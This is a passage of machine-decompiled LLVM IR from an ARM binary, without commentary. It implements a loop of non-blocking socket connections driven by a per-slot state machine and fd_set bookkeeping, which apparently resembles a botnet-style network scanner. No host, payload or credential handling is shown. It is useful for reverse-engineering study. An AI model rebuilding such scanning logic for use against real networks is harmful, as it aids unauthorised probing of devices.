  %v2_87b8 = ptrtoint i32* %stack_var_-200 to i32
  %v2_87bc = ptrtoint i32* %stack_var_-328 to i32
  %v2_921c = add i32 %v2_8748, -20773
  %v2_88a8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_88b4 = ptrtoint i32* %stack_var_-48 to i32
  %v5_8590 = or i32 %v4_8590, %v3_9eb8
  %v1_8594 = and i32 %v3_9eb8, 128
  %v2_8594 = icmp ne i32 %v1_8594, 0
  %v3_8594248 = udiv i32 %v5_8590, 256
  %v1_859c = add i32 %stack_var_-20872.0.ph, -1464
  %v1_85a4 = add i32 %stack_var_-20872.0.ph, -33
  %sext = mul i32 %v3_8594248, 16777216
  %v4_8710 = sdiv i32 %sext, 16777216
  %sext10 = mul i32 %v3_9eb8, 16777216
  %v4_8718 = sdiv i32 %sext10, 16777216
  %v2_85dc = add i32 %v2_86d0, 112
  br label %dec_label_pc_8528

dec_label_pc_8528:                                ; preds = %dec_label_pc_8794, %dec_label_pc_878c, %dec_label_pc_8574, %dec_label_pc_8838, %dec_label_pc_8528.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_852c = call i32 @function_13924(i32* null)
  store i32 %v2_852c, i32* %r0.global-to-local, align 4
  store i32 %v2_852c, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 20684, i32* %ip.global-to-local, align 4
  %v2_854c256 = load i32, i32* @sp, align 4
  %v3_854c257 = add i32 %v2_854c256, 20684
  %v4_854c258 = inttoptr i32 %v3_854c257 to i32*
  store i32 0, i32* %v4_854c258, align 4
  br label %dec_label_pc_853c.dec_label_pc_853c_crit_edge

dec_label_pc_853c.dec_label_pc_853c_crit_edge:    ; preds = %dec_label_pc_8528, %dec_label_pc_853c.dec_label_pc_853c_crit_edge
  %v0_853c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_854c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_8540 = add i32 %v0_853c.pre, 4
  store i32 %v1_8540, i32* %r3.global-to-local, align 4
  %v1_8544 = add i32 %v0_853c.pre, 20684
  store i32 %v1_8544, i32* %ip.global-to-local, align 4
  %v7_8548 = icmp eq i32 %v1_8540, 128
  %v2_854c = load i32, i32* @sp, align 4
  %v3_854c = add i32 %v2_854c, %v1_8544
  %v4_854c = inttoptr i32 %v3_854c to i32*
  store i32 %v0_854c.pre, i32* %v4_854c, align 4
  br i1 %v7_8548, label %dec_label_pc_8554, label %dec_label_pc_853c.dec_label_pc_853c_crit_edge

dec_label_pc_8554:                                ; preds = %dec_label_pc_853c.dec_label_pc_853c_crit_edge
  %v1_8548 = add i32 %v0_853c.pre, -124
  %v6_8548 = icmp slt i32 %v1_8548, 0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_8548, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_8554 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8554, i32* %r0.global-to-local, align 4
  %v1_8560259 = add i32 %v0_8554, 4
  store i32 %v1_8560259, i32* %r3.global-to-local, align 4
  %v1_8564260 = add i32 %v0_8554, 20556
  store i32 %v1_8564260, i32* %lr.global-to-local, align 4
  %v7_8568261 = icmp eq i32 %v1_8560259, 128
  %v2_856c262 = load i32, i32* @sp, align 4
  %v3_856c263 = add i32 %v2_856c262, %v1_8564260
  %v4_856c264 = inttoptr i32 %v3_856c263 to i32*
  store i32 %v0_8554, i32* %v4_856c264, align 4
  br i1 %v7_8568261, label %dec_label_pc_8574, label %dec_label_pc_855c.dec_label_pc_855c_crit_edge

dec_label_pc_855c.dec_label_pc_855c_crit_edge:    ; preds = %dec_label_pc_8554, %dec_label_pc_855c.dec_label_pc_855c_crit_edge
  %v0_855c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_856c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_8560 = add i32 %v0_855c.pre, 4
  store i32 %v1_8560, i32* %r3.global-to-local, align 4
  %v1_8564 = add i32 %v0_855c.pre, 20556
  store i32 %v1_8564, i32* %lr.global-to-local, align 4
  %v7_8568 = icmp eq i32 %v1_8560, 128
  %v2_856c = load i32, i32* @sp, align 4
  %v3_856c = add i32 %v2_856c, %v1_8564
  %v4_856c = inttoptr i32 %v3_856c to i32*
  store i32 %v0_856c.pre, i32* %v4_856c, align 4
  br i1 %v7_8568, label %dec_label_pc_8574, label %dec_label_pc_855c.dec_label_pc_855c_crit_edge

dec_label_pc_8574:                                ; preds = %dec_label_pc_855c.dec_label_pc_855c_crit_edge, %dec_label_pc_8554
  store i32 %v0_839c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_83b8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp207, label %dec_label_pc_8528, label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %dec_label_pc_8574
  store i32 %stack_var_-20872.0.ph, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 %v5_8590, i32* %r2.global-to-local, align 4
  store i1 %v2_8594, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_8594248, i32* %lr.global-to-local, align 4
  %v0_8598 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8598, i32* @sl, align 4
  store i32 %v1_859c, i32* @r7, align 4
  store i32 %v0_8598, i32* @r8, align 4
  store i32 %v1_85a4, i32* @r6, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_8650

dec_label_pc_85b8:                                ; preds = %dec_label_pc_865c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v7_85b8 = icmp eq i8 %v3_8650, 2
  store i1 %v7_85b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85b8, label %dec_label_pc_8d68, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %dec_label_pc_85b8
  %v2_85c0 = icmp ugt i8 %v3_8650, 3
  store i1 %v2_85c0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_85c0 = icmp ult i8 %v3_8650, 4
  store i1 %v6_85c0, i1* %cpsr_n.global-to-local, align 1
  %v7_85c0 = icmp eq i8 %v3_8650, 4
  store i1 %v7_85c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c0, label %dec_label_pc_890c, label %dec_label_pc_85c8

dec_label_pc_85c8:                                ; preds = %dec_label_pc_85c0
  %v2_85c8 = icmp ugt i8 %v3_8650, 5
  store i1 %v2_85c8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_85c8 = icmp ult i8 %v3_8650, 6
  store i1 %v6_85c8, i1* %cpsr_n.global-to-local, align 1
  %v7_85c8 = icmp eq i8 %v3_8650, 6
  store i1 %v7_85c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c8, label %.thread24, label %dec_label_pc_85e8

.thread24:                                        ; preds = %dec_label_pc_85c8
  %v2_85cc = add i32 %v3_8900, -1431
  %v3_85cc = inttoptr i32 %v2_85cc to i32*
  %v4_85cc = load i32, i32* %v3_85cc, align 4
  store i32 %v4_85cc, i32* %r0.global-to-local, align 4
  %v4_85d4 = udiv i32 %v4_85cc, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_85d8 = mul nuw nsw i32 %v4_85d4, 4
  store i32 %v2_85dc, i32* %r1.global-to-local, align 4
  %v3_85e0 = add i32 %v4_85d8, %v2_85dc
  store i32 %v3_85e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d48

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85c8
  %v2_85e8 = icmp ugt i8 %v3_8650, 6
  store i1 %v2_85e8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_85e8 = icmp ult i8 %v3_8650, 7
  store i1 %v6_85e8, i1* %cpsr_n.global-to-local, align 1
  %v7_85e8 = icmp eq i8 %v3_8650, 7
  store i1 %v7_85e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85e8, label %.thread35, label %dec_label_pc_8608

.thread35:                                        ; preds = %dec_label_pc_85e8
  %v2_85ec = add i32 %v3_8900, -1431
  %v3_85ec = inttoptr i32 %v2_85ec to i32*
  %v4_85ec = load i32, i32* %v3_85ec, align 4
  store i32 %v4_85ec, i32* %r0.global-to-local, align 4
  %v4_85f4 = udiv i32 %v4_85ec, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_85f8 = mul nuw nsw i32 %v4_85f4, 4
  store i32 %v2_85dc, i32* %r2.global-to-local, align 4
  %v3_8600 = add i32 %v4_85f8, %v2_85dc
  store i32 %v3_8600, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d48

dec_label_pc_8608:                                ; preds = %dec_label_pc_85e8
  %v2_8608 = icmp ugt i8 %v3_8650, 9
  store i1 %v2_8608, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8608 = icmp ult i8 %v3_8650, 10
  store i1 %v6_8608, i1* %cpsr_n.global-to-local, align 1
  %v7_8608 = icmp eq i8 %v3_8650, 10
  store i1 %v7_8608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8608, label %dec_label_pc_8d30, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8608
  %v1_8610 = add nsw i32 %v4_8650, -11
  %v2_8610 = icmp ugt i8 %v3_8650, 10
  store i1 %v2_8610, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8610 = icmp ult i8 %v3_8650, 11
  store i1 %v6_8610, i1* %cpsr_n.global-to-local, align 1
  %v7_8610 = icmp eq i8 %v3_8650, 11
  store i1 %v7_8610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8610, label %dec_label_pc_98a4, label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_8d68, %dec_label_pc_8610
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_8650, align 1
  %v0_8620 = load i32, i32* @r6, align 4
  %v1_8620 = add i32 %v0_8620, -1431
  %v2_8620 = inttoptr i32 %v1_8620 to i32*
  %v3_8620 = load i32, i32* %v2_8620, align 4
  store i32 %v3_8620, i32* %r0.global-to-local, align 4
  %v1_8624 = call i32 @function_13654(i32 %v3_8620)
  store i32 %v1_8624, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_862c = load i32, i32* @r6, align 4
  %v2_862c = add i32 %v1_862c, -1431
  %v3_862c = inttoptr i32 %v2_862c to i32*
  store i32 -1, i32* %v3_862c, align 4
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8ccc, %dec_label_pc_8d48, %dec_label_pc_8750, %dec_label_pc_8664, %dec_label_pc_98a4, %dec_label_pc_8618
  store i32 %v0_839c, i32* %lr.global-to-local, align 4
  %v0_8634 = load i32, i32* @r8, align 4
  %v1_8634 = add i32 %v0_8634, 1
  store i32 %v1_8634, i32* @r8, align 4
  %v0_8638 = load i32, i32* @r7, align 4
  %v0_863c = load i32, i32* @r6, align 4
  %v2_8640 = sub i32 %v0_839c, %v1_8634
  %v3_8640 = icmp uge i32 %v0_839c, %v1_8634
  store i1 %v3_8640, i1* %cpsr_c.global-to-local, align 1
  %v4_8640 = xor i32 %v1_8634, %v0_839c
  %v5_8640 = xor i32 %v2_8640, %v0_839c
  %v6_8640 = and i32 %v5_8640, %v4_8640
  %v7_8640 = icmp slt i32 %v6_8640, 0
  store i1 %v7_8640, i1* %cpsr_v.global-to-local, align 1
  %v8_8640 = icmp slt i32 %v2_8640, 0
  store i1 %v8_8640, i1* %cpsr_n.global-to-local, align 1
  %v9_8640 = icmp eq i32 %v0_839c, %v1_8634
  store i1 %v9_8640, i1* %cpsr_z.global-to-local, align 1
  %v1_8644 = add i32 %v0_8638, 3140
  store i32 %v1_8644, i32* @r7, align 4
  %v1_8648 = add i32 %v0_863c, 3140
  store i32 %v1_8648, i32* @r6, align 4
  br i1 %v9_8640, label %dec_label_pc_8630.dec_label_pc_878c_crit_edge, label %dec_label_pc_8650

dec_label_pc_8630.dec_label_pc_878c_crit_edge:    ; preds = %dec_label_pc_8630
  %v0_878c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_878c

dec_label_pc_8650:                                ; preds = %dec_label_pc_876c, %dec_label_pc_8630, %dec_label_pc_8580
  %v3_8900 = phi i32 [ %v1_85a4, %dec_label_pc_8580 ], [ %v1_8648, %dec_label_pc_8630 ], [ %v1_8784, %dec_label_pc_876c ]
  %v1_8650 = add i32 %v3_8900, -1427
  %v2_8650 = inttoptr i32 %v1_8650 to i8*
  %v3_8650 = load i8, i8* %v2_8650, align 1
  %v4_8650 = zext i8 %v3_8650 to i32
  store i32 %v4_8650, i32* %r3.global-to-local, align 4
  %v2_8654 = icmp ne i8 %v3_8650, 0
  store i1 %v2_8654, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8654 = icmp eq i8 %v3_8650, 0
  store i1 %v6_8654, i1* %cpsr_n.global-to-local, align 1
  %v7_8654 = icmp eq i8 %v3_8650, 1
  store i1 %v7_8654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8654, label %dec_label_pc_88f4, label %dec_label_pc_865c

dec_label_pc_865c:                                ; preds = %dec_label_pc_8650
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v6_8654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_8654, label %dec_label_pc_8664, label %dec_label_pc_85b8

dec_label_pc_8664:                                ; preds = %.thread43.dec_label_pc_8664_crit_edge, %dec_label_pc_865c
  %v0_8664 = phi i32 [ %v0_8664.pre, %.thread43.dec_label_pc_8664_crit_edge ], [ %v3_8900, %dec_label_pc_865c ]
  %v1_8664 = add i32 %v0_8664, -1431
  %v2_8664 = inttoptr i32 %v1_8664 to i32*
  %v3_8664 = load i32, i32* %v2_8664, align 4
  store i32 %v3_8664, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v1_8670 = add i32 %v3_8664, 1
  %v2_8670 = icmp eq i32 %v3_8664, -1
  store i1 %v2_8670, i1* %cpsr_c.global-to-local, align 1
  %v3_8670 = sub i32 0, %v3_8664
  %v4_8670 = and i32 %v1_8670, %v3_8670
  %v5_8670 = icmp slt i32 %v4_8670, 0
  store i1 %v5_8670, i1* %cpsr_v.global-to-local, align 1
  %v6_8670 = icmp slt i32 %v1_8670, 0
  store i1 %v6_8670, i1* %cpsr_n.global-to-local, align 1
  %v7_8670 = icmp eq i32 %v1_8670, 0
  store i1 %v7_8670, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-72, align 4
  %v1_8684 = xor i1 %v7_8670, true
  call void @__pseudo_cond_branch(i1 %v1_8684, i32 ptrtoint (i32* @global_var_13654.26 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_8690 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_8690, i32* %r2.global-to-local, align 4
  %v3_8694 = call i32 @function_13f50(i32 2, i32 1, i32 %v0_8690)
  store i32 %v3_8694, i32* %r0.global-to-local, align 4
  %v1_8698 = add i32 %v3_8694, 1
  %v2_8698 = icmp eq i32 %v3_8694, -1
  store i1 %v2_8698, i1* %cpsr_c.global-to-local, align 1
  %v3_8698 = sub i32 0, %v3_8694
  %v4_8698 = and i32 %v1_8698, %v3_8698
  %v5_8698 = icmp slt i32 %v4_8698, 0
  store i1 %v5_8698, i1* %cpsr_v.global-to-local, align 1
  %v6_8698 = icmp slt i32 %v1_8698, 0
  store i1 %v6_8698, i1* %cpsr_n.global-to-local, align 1
  %v7_8698 = icmp eq i32 %v1_8698, 0
  store i1 %v7_8698, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8694, i32* @r4, align 4
  %v1_86a0 = load i32, i32* @r6, align 4
  %v2_86a0 = add i32 %v1_86a0, -1431
  %v3_86a0 = inttoptr i32 %v2_86a0 to i32*
  store i32 %v3_8694, i32* %v3_86a0, align 4
  br i1 %v7_8698, label %dec_label_pc_8630, label %dec_label_pc_86a8

dec_label_pc_86a8:                                ; preds = %dec_label_pc_8664
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_86ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_86ac, i32* @r2, align 4
  %v0_86b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_86b0 = call i32 @function_13564(i32 %v0_86b0, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_86b8 = or i32 %v2_86b0, 2048
  store i32 %v1_86b8, i32* @r2, align 4
  %v0_86bc = load i32, i32* @r4, align 4
  store i32 %v0_86bc, i32* %r0.global-to-local, align 4
  %v2_86c0 = call i32 @function_13564(i32 %v0_86bc, i32 4)
  store i32 %v2_86c0, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_86d0, i32* %r3.global-to-local, align 4
  %v0_86d4 = load i32, i32* @r6, align 4
  %v1_86d4 = add i32 %v0_86d4, -1431
  %v2_86d4 = inttoptr i32 %v1_86d4 to i32*
  %v3_86d4 = load i32, i32* %v2_86d4, align 4
  store i32 %v3_86d4, i32* %r0.global-to-local, align 4
  %v0_86d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_86d8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-40, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_86e8, i32* %r3.global-to-local, align 4
  %v6_86f0 = call i32 @function_13f20(i32 %v3_86d4, i32 %v0_86d8, i32 8, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_86f0, i32* %r0.global-to-local, align 4
  %v0_86f4 = load i32, i32* @r6, align 4
  %v1_86f4 = add i32 %v0_86f4, -1415
  %v2_86f4 = inttoptr i32 %v1_86f4 to i32*
  %v3_86f4 = load i32, i32* %v2_86f4, align 4
  store i32 %v3_86f4, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_8704 = add i32 %v0_86f4, -1431
  %v2_8704 = inttoptr i32 %v1_8704 to i32*
  %v3_8704 = load i32, i32* %v2_8704, align 4
  store i32 %v3_8704, i32* %r0.global-to-local, align 4
  %v3_870c = add i32 %v0_86f4, -1427
  %v4_870c = inttoptr i32 %v3_870c to i8*
  store i8 2, i8* %v4_870c, align 1
  store i32 %v4_8710, i32* %ip.global-to-local, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8714, i32* %stack_var_-72, align 4
  store i32 %v4_8718, i32* %r3.global-to-local, align 4
  store i32 %v2_8728, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_8730 = load i32, i32* %sb.global-to-local, align 4
  %v1_8730 = load i32, i32* @r6, align 4
  %v2_8730 = add i32 %v1_8730, -1423
  %v3_8730 = inttoptr i32 %v2_8730 to i32*
  store i32 %v0_8730, i32* %v3_8730, align 4
  %v4_8734 = call i32 @function_13dac(i32 %v3_8704, %sockaddr* nonnull %v3_8734, i32 16)
  store i32 %v4_8734, i32* %r0.global-to-local, align 4
  %v0_8738 = load i32, i32* @r6, align 4
  %v1_8738 = add i32 %v0_8738, -1431
  %v2_8738 = inttoptr i32 %v1_8738 to i32*
  %v3_8738 = load i32, i32* %v2_8738, align 4
  store i32 %v3_8738, i32* %r0.global-to-local, align 4
  %v3_8740 = udiv i32 %v3_8738, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8744 = mul nuw nsw i32 %v3_8740, 4
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_8750

dec_label_pc_8750:                                ; preds = %dec_label_pc_8d78, %dec_label_pc_86a8
  %v1_875c = phi i32 [ %v3_8738, %dec_label_pc_86a8 ], [ %v3_8d78, %dec_label_pc_8d78 ]
  %v3_8744.pn = phi i32 [ %v3_8744, %dec_label_pc_86a8 ], [ %v3_8d84, %dec_label_pc_8d78 ]
  %storemerge = add i32 %v3_8744.pn, %v2_8748
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_8750 = add i32 %storemerge, -292
  %v2_8750 = inttoptr i32 %v1_8750 to i32*
  %v3_8750 = load i32, i32* %v2_8750, align 4
  %v1_8754 = urem i32 %v1_875c, 32
  store i32 %v1_8754, i32* %r1.global-to-local, align 4
  %v1_8758 = load i32, i32* %fp.global-to-local, align 4
  %v7_8758 = shl i32 %v1_8758, %v1_8754
  %v8_8758 = or i32 %v7_8758, %v3_8750
  store i32 %v8_8758, i32* %r2.global-to-local, align 4
  %v0_875c = load i32, i32* @sl, align 4
  %v2_875c = sub i32 %v0_875c, %v1_875c
  %v3_875c = icmp uge i32 %v0_875c, %v1_875c
  store i1 %v3_875c, i1* %cpsr_c.global-to-local, align 1
  %v4_875c = xor i32 %v0_875c, %v1_875c
  %v5_875c = xor i32 %v2_875c, %v0_875c
  %v6_875c = and i32 %v5_875c, %v4_875c
  %v7_875c = icmp slt i32 %v6_875c, 0
  store i1 %v7_875c, i1* %cpsr_v.global-to-local, align 1
  %v8_875c = icmp slt i32 %v2_875c, 0
  store i1 %v8_875c, i1* %cpsr_n.global-to-local, align 1
  %v9_875c = icmp eq i32 %v0_875c, %v1_875c
  store i1 %v9_875c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8758, i32* %v2_8750, align 4
  %v2_8764 = xor i1 %v8_875c, %v7_875c
  br i1 %v2_8764, label %dec_label_pc_8768, label %dec_label_pc_8630

dec_label_pc_8768:                                ; preds = %dec_label_pc_8750
  %v0_8768 = load i32, i32* %r0.global-to-local, align 4
  %v1_8768 = add i32 %v0_8768, 1
  store i32 %v1_8768, i32* @sl, align 4
  br label %dec_label_pc_876c

dec_label_pc_876c:                                ; preds = %dec_label_pc_8d60, %dec_label_pc_8d28, %dec_label_pc_8768
  %v0_878c98 = phi i32 [ %v1_8d60, %dec_label_pc_8d60 ], [ %v1_8d28, %dec_label_pc_8d28 ], [ %v1_8768, %dec_label_pc_8768 ]
  store i32 %v0_839c, i32* %lr.global-to-local, align 4
  %v0_8770 = load i32, i32* @r8, align 4
  %v1_8770 = add i32 %v0_8770, 1
  store i32 %v1_8770, i32* @r8, align 4
  %v0_8774 = load i32, i32* @r7, align 4
  %v0_8778 = load i32, i32* @r6, align 4
  %v2_877c = sub i32 %v0_839c, %v1_8770
  %v3_877c = icmp uge i32 %v0_839c, %v1_8770
  store i1 %v3_877c, i1* %cpsr_c.global-to-local, align 1
  %v4_877c = xor i32 %v1_8770, %v0_839c
  %v5_877c = xor i32 %v2_877c, %v0_839c
  %v6_877c = and i32 %v5_877c, %v4_877c
  %v7_877c = icmp slt i32 %v6_877c, 0
  store i1 %v7_877c, i1* %cpsr_v.global-to-local, align 1
  %v8_877c = icmp slt i32 %v2_877c, 0
  store i1 %v8_877c, i1* %cpsr_n.global-to-local, align 1
  %v9_877c = icmp eq i32 %v0_839c, %v1_8770
  store i1 %v9_877c, i1* %cpsr_z.global-to-local, align 1
  %v1_8780 = add i32 %v0_8774, 3140
  store i32 %v1_8780, i32* @r7, align 4
  %v1_8784 = add i32 %v0_8778, 3140
  store i32 %v1_8784, i32* @r6, align 4
  br i1 %v9_877c, label %dec_label_pc_878c, label %dec_label_pc_8650

dec_label_pc_878c:                                ; preds = %dec_label_pc_876c, %dec_label_pc_8630.dec_label_pc_878c_crit_edge
  %v0_87c4 = phi i32 [ %v0_878c.pre, %dec_label_pc_8630.dec_label_pc_878c_crit_edge ], [ %v0_878c98, %dec_label_pc_876c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_878c = icmp slt i32 %v0_87c4, 0
  store i1 %v1_878c, i1* %cpsr_n.global-to-local, align 1
  %v2_878c = icmp eq i32 %v0_87c4, 0
  store i1 %v2_878c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_878c, label %dec_label_pc_8528, label %dec_label_pc_8794

dec_label_pc_8794:                                ; preds = %dec_label_pc_878c
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 %v2_87b4, i32* %ip.global-to-local, align 4
  store i32 %v2_87b8, i32* %r1.global-to-local, align 4
  store i32 %v2_87bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_87c4, i32* %r0.global-to-local, align 4
  %v5_87cc = call i32 @function_13874(i32 %v0_87c4, i32 %v2_87b8, i32 %v2_87bc, i32 0, i32 %v2_87b4)
  store i32 %v5_87cc, i32* @r4, align 4
  %v0_87d4 = load i32, i32* @r5, align 4
  store i32 %v0_87d4, i32* %r0.global-to-local, align 4
  %v1_87d8 = inttoptr i32 %v0_87d4 to i32*
  %v2_87d8 = call i32 @function_13924(i32* %v1_87d8)
  store i32 %v2_87d8, i32* %r0.global-to-local, align 4
  %v0_87dc = load i32, i32* @r4, align 4
  %v1_87dc = load i32, i32* @r5, align 4
  %v2_87dc = sub i32 %v0_87dc, %v1_87dc
  %v3_87dc = icmp uge i32 %v0_87dc, %v1_87dc
  store i1 %v3_87dc, i1* %cpsr_c.global-to-local, align 1
  %v4_87dc = xor i32 %v1_87dc, %v0_87dc
  %v5_87dc = xor i32 %v2_87dc, %v0_87dc
  %v6_87dc = and i32 %v5_87dc, %v4_87dc
  %v7_87dc = icmp slt i32 %v6_87dc, 0
  store i1 %v7_87dc, i1* %cpsr_v.global-to-local, align 1
  %v8_87dc = icmp slt i32 %v2_87dc, 0
  store i1 %v8_87dc, i1* %cpsr_n.global-to-local, align 1
  %v9_87dc = icmp eq i32 %v0_87dc, %v1_87dc
  store i1 %v9_87dc, i1* %cpsr_z.global-to-local, align 1
  %v7_87e4 = icmp sgt i32 %v0_87dc, %v1_87dc
  br i1 %v7_87e4, label %dec_label_pc_87e8, label %dec_label_pc_8528

dec_label_pc_87e8:                                ; preds = %dec_label_pc_8794
  store i32 %stack_var_-20868.0.ph, i32* @r8, align 4
  br label %dec_label_pc_8858

dec_label_pc_87f4:                                ; preds = %.thread38.dec_label_pc_87f4_crit_edge, %dec_label_pc_8868
  %v0_880c = phi i32 [ %v0_87f4.pre, %.thread38.dec_label_pc_87f4_crit_edge ], [ %v3_8858, %dec_label_pc_8868 ]
  %v3_87f4 = udiv i32 %v0_880c, 32
  store i32 %v2_8748, i32* %r2.global-to-local, align 4
  %v3_8800 = mul nuw nsw i32 %v3_87f4, 4
  %v2_8804 = add i32 %v3_8800, %v2_8748
  store i32 %v2_8804, i32* %r3.global-to-local, align 4
  %v1_8808 = add i32 %v2_8804, -164
  %v2_8808 = inttoptr i32 %v1_8808 to i32*
  %v3_8808 = load i32, i32* %v2_8808, align 4
  %v1_880c = urem i32 %v0_880c, 32
  store i32 %v1_880c, i32* %r1.global-to-local, align 4
  %v2_8810 = add nsw i32 %v1_880c, -1
  %v3_8810 = shl i32 1, %v2_8810
  %v4_8810 = and i32 %v3_8810, %v3_8808
  %v5_8810 = icmp ne i32 %v4_8810, 0
  store i1 %v5_8810, i1* %cpsr_c.global-to-local, align 1
  %v6_8810 = lshr i32 %v3_8808, %v1_880c
  store i32 %v6_8810, i32* %r2.global-to-local, align 4
  %v1_8814 = urem i32 %v6_8810, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_8814 = icmp eq i32 %v1_8814, 0
  store i1 %v2_8814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8814, label %dec_label_pc_8838, label %dec_label_pc_881c

dec_label_pc_881c:                                ; preds = %dec_label_pc_87f4
  %v0_881c = load i32, i32* @r8, align 4
  %v1_881c = add i32 %v0_881c, -1452
  %v2_881c = inttoptr i32 %v1_881c to i8*
  %v3_881c = load i8, i8* %v2_881c, align 1
  %v4_881c = zext i8 %v3_881c to i32
  store i32 %v4_881c, i32* %r3.global-to-local, align 4
  %v2_8820 = icmp ugt i8 %v3_881c, 5
  store i1 %v2_8820, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8820 = icmp ult i8 %v3_881c, 6
  store i1 %v6_8820, i1* %cpsr_n.global-to-local, align 1
  %v7_8820 = icmp eq i8 %v3_881c, 6
  store i1 %v7_8820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8820, label %dec_label_pc_8dd0, label %dec_label_pc_8828

dec_label_pc_8828:                                ; preds = %dec_label_pc_881c
  %v2_8828 = icmp ugt i8 %v3_881c, 6
  store i1 %v2_8828, i1* %cpsr_c.global-to-local, align 1
